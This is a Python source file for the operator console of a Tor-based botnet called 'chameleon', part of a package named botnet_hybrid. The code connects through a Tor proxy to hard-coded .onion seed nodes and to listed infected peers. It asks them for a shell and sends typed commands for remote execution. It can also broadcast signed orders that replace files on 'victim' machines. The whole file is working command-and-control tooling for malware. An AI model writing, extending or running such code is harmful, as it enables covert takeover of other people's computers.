import socket
import socks
import random
import readline
from colorama import Fore, Style
import argparse
import cmd2
from cmd2 import with_argparser, with_category, categorize

from botnet_hybrid import ENCODING
from botnet_hybrid.message import structure_msg, sign_structured_msg
from botnet_hybrid.security import decrypt, calculate_file_hash
from botnet_hybrid.operations import close_terminal, broadcast

BUFFER_SIZE = 4096
TOR_SERVER_PORT = 50001

SHELL = 1
UPDATE_FILE = 2

readline.parse_and_bind("tab: complete")


socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
socket.socket = socks.socksocket

seed_directions = [("kdq2tg4jedd5tqxs.onion", "57yvvr2pfb46zull.onion")]


def make_blue(msg: str):
    return f"{Fore.LIGHTBLUE_EX}{msg}{Style.RESET_ALL}"


class MyPrompt(cmd2.Cmd):
    prompt = make_blue("chameleon> ")
    intro = make_blue(
        """
   _____ _                          _                  
  / ____| |                        | |                 
 | |    | |__   __ _ _ __ ___   ___| | ___  ___  _ __  
 | |    | '_ \ / _` | '_ ` _ \ / _ | |/ _ \/ _ \| '_ \ 
 | |____| | | | (_| | | | | | |  __| |  __| (_) | | | |
  \_____|_| |_|\__,_|_| |_| |_|\___|_|\___|\___/|_| |_|
                                                      
                                                       


    """
    )

    def __init__(self):
        super().__init__()
        del cmd2.Cmd.do_alias
        del cmd2.Cmd.do_macro
        del cmd2.Cmd.do_quit
        del cmd2.Cmd.do_shortcuts
        self.hidden_commands.append("edit")
        self.hidden_commands.append("set")
        self.hidden_commands.append("EOF")
        self.hidden_commands.append("py")
        self.hidden_commands.append("run_pyscript")
        self.hidden_commands.append("run_script")

    __botnet = "botnet"
    __setup = "setup"
    __basic = "basic"

    __private_key_path = None
    __socket = None
    __terminal = False

    categorize(
        (cmd2.Cmd.do_shell, cmd2.Cmd.do_history, cmd2.Cmd.do_help), __basic,
    )

    set_pem_argparser = argparse.ArgumentParser(
        description="Set where the private key file is stored"
    )
    set_pem_argparser.add_argument(
        "private_key_path", help="path where the file is located",
    )

    @with_argparser(set_pem_argparser)
    @with_category(__setup)
    def do_set_pem(self, args: argparse.Namespace):
        path = args.private_key_path
        if not path:
            print_red("No path to private key file provided")

        self.__private_key_path = path
        print_yellow(f"Private key path -> {self.__private_key_path}")

    connect_argparser = argparse.ArgumentParser(description="Connect to server")
    connect_argparser.add_argument(
        "-a",
        "--num-anonymizers",
        type=int,
        dest="num_anonymizers",
        help="Number of hops between origin and recipient",
        default=0,
    )
    connect_argparser.add_argument(
        "-n",
        "--file-nodes",
        dest="node_list_path",
        help="Path to file containing a list with nodes in the"
        + " format (name, download address, communication address)",
        default=None,
    )

    @with_argparser(connect_argparser)
    @with_category(__botnet)
    def do_connect(self, args: argparse.Namespace):
        if self.__private_key_path is None:
            print_red("Private key path is not configured")
            return

        node_list_path = args.node_list_path
        num_anonymizers = args.num_anonymizers

        print_green("\nWhich server do you want to connect to?\n")
        node_list = complete_node_list(node_list_path)
        print_list_with_indexes(node_list)

        print_green("\n\nIntroduce position of the server in the list:")
        selected_index = int(input())
        selected_node = node_from_index(selected_index, seed_directions, node_list_path)

        try:
            self.__connect(selected_node, num_anonymizers)
        except Exception as e:
            print_red("Could not establisha communication with the specified node")
            print_red(e)
            return

        self.prompt = make_blue(f"chameleon {selected_node}> ")
        self.__terminal = True

    def __connect(self, recipient: str, num_anonymizers: int = 0):
        if num_anonymizers > 0:
            next_hop = random.choice(seed_directions)[1]
        else:
            next_hop = recipient

        self.__socket = socket.socket()
        self.__socket.connect((next_hop, TOR_SERVER_PORT))
        self.__send_msg(SHELL, "I want a shell", num_anonymizers, recipient)

    def __send_msg(
        self, msg_type: int, msg: str, num_anonymizers: str = "0", address: str = ""
    ):
        msg_info = {
            "num_anonymizers": num_anonymizers,
            "onion": address,
            "msg_type": msg_type,
            "msg": msg,
        }
        msg = structure_msg(msg_info)
        signed_msg = sign_structured_msg(msg, self.__private_key_path)
        self.__socket.send(signed_msg)

    disconnect_arg_parser = argparse.ArgumentParser(
        description="Disconnect from server"
    )

    @with_argparser(disconnect_arg_parser)
    @with_category(__botnet)
    def do_disconnect(self, input: str):
        if self.__socket:
            close_terminal(self.__socket)
        self.prompt = make_blue(f"chameleon> ")
        self.__terminal = False

    def help_disconnect(self):
        print("Usage: disconnect\n\n" + "close shell\n")

    update_argparser = argparse.ArgumentParser(
        description="Send a message to each peer to update some file"
    )
    update_argparser.add_argument(
        "-s",
        "--hash-from-file",
        type=str,
        dest="file_path_to_hash",
        help="File we need to calculate the hash so each peers knows if their"
        + " copy needs an update",
        required=True,
    )
    update_argparser.add_argument(
        "-f",
        "--file-path-in-victim",
        type=str,
        dest="file_path_in_victim",
        help="File path where the file to be updated is in the victim",
        required=True,
    )
    update_argparser.add_argument(
        "-n",
        "--file-nodes",
        dest="node_list_path",
        help="Path to file containing a list with nodes in the"
        + " format (name, download address, communication address)",
        default=None,
    )

    @with_argparser(update_argparser)
    @with_category(__botnet)
    def do_update(self, args: argparse.Namespace):
        if self.__private_key_path is None:
            print_red("Private key path is not configured")
            return

        file_path = args.file_path_in_victim
        file_path_to_hash = args.file_path_to_hash
        node_list_path = args.node_list_path

        print_green("\nWhich server has the updated file?\n")
        node_list = complete_node_list(node_list_path)
        print_list_with_indexes(node_list)

        print_green("\n\nIntroduce position of the server in the list:")
        selected_index = int(input())
        selected_node = node_from_index(
            selected_index, seed_directions, node_list_path, "down"
        )

        msg_info = {
            "msg_type": UPDATE_FILE,
            "msg": f"{file_path} {calculate_file_hash(file_path_to_hash)} "
            + f"{selected_node}",
        }
        msg = structure_msg(msg_info)
        signed_msg = sign_structured_msg(msg, self.__private_key_path)
        with open(node_list_path, "r") as neighbours:
            neighbours_info = neighbours.readlines()
        victim_directions = [
            line.strip().split()[2].strip() for line in neighbours_info
        ]
        onions = [seed_comm[1] for seed_comm in seed_directions] + victim_directions
        broadcast(TOR_SERVER_PORT, signed_msg, onions)

    @with_category(__basic)
    def do_exit(self, input: str):
        return True

    def help_exit(self):
        print("exit the prompt")

    def default(self, inp: cmd2.Statement):
        msg = inp.command_and_args
        if self.__terminal is True:
            self.__execute_remotely(msg)
        else:
            if msg == "q":
                return self.do_exit(msg)
            else:
                print("Unrecognized command")

    def __execute_remotely(self, msg: str):
        coded_msg = msg.encode(ENCODING)
        self.__socket.send(coded_msg)
        ciphertext = self.__socket.recv(BUFFER_SIZE)
        plain_text = decrypt(ciphertext, self.__private_key_path)
        print_yellow(plain_text)

    do_EOF = do_exit
    help_EOF = help_exit


def complete_node_list(node_list_path: str = None) -> list:
    seed_list = seed_name_list(seed_directions)
    node_list = node_name_list(node_list_path)
    union_list = seed_list + node_list

    return union_list


def seed_name_list(seeds: list) -> list:
    seed_list = [f"seed{i}" for i in range(len(seed_directions))]
    return seed_list


def node_name_list(node_list_path: str = None) -> list:
    if not node_list_path:
        return []

    with open(node_list_path, "r") as f:
        rows = f.readlines()
    node_list = [node.split(" ")[0].strip() for node in rows]

    return node_list


def print_list_with_indexes(item_list: list):
    for position, item in enumerate(item_list):
        print_green(f"{position}. {item}")


def node_from_index(
    index: int, seed_directions: list, node_list_path: str = None, type: str = "comm"
) -> str:
    num_seeds = len(seed_directions)
    if index < num_seeds:
        pos = 1 if type == "comm" else 0
        node = seed_directions[index][pos]
    else:
        pos = 2 if type == "comm" else 1
        if node_list_path:
            with open(node_list_path, "r") as f:
                lines = f.readlines()
                node = lines[index - num_seeds].split()[pos].strip()

    return node


def complete(arguments: list, text: str):
    completions = [argument for argument in arguments if argument.startswith(text)]
    return completions


def print_red(msg: str):
    print(f"{Fore.LIGHTRED_EX}{msg}{Style.RESET_ALL}")


def print_yellow(msg: str):
    print(f"{Fore.LIGHTYELLOW_EX}{msg}{Style.RESET_ALL}")


def print_green(msg: str):
    print(f"{Fore.LIGHTGREEN_EX}{msg}{Style.RESET_ALL}")


if __name__ == "__main__":
    MyPrompt().cmdloop()
